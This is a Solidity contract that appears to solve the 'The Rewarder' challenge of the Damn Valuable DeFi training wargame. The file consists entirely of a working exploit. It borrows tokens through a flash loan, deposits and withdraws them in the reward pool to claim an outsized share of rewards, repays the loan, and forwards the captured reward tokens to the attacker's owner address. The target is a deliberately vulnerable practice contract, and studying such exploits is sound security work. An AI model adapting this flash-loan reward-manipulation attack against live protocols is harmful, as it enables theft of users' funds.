// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract AttackReward is Ownable{
    FlashLoanerPool pool;
    DamnValuableToken public liquidityToken;
    TheRewarderPool rewardPool;

    constructor(
        address poolAddrss,
        address liquidity,
        address rewardPoolAddress
    ) {
        pool = FlashLoanerPool(poolAddrss);
        liquidityToken  = DamnValuableToken(liquidity);
        rewardPool = TheRewarderPool(rewardPoolAddress);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        // Approve the reward pool to spend our borrowed funds
        liquidityToken.approve(address(rewardPool), amount);

        // Deposit massive portion of funds and distributes rewards
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        // Return funds
        liquidityToken.transfer(address(pool), amount);
        // Transfer funds back to attacker
        uint256 currBalance =rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner(),currBalance);
    }
}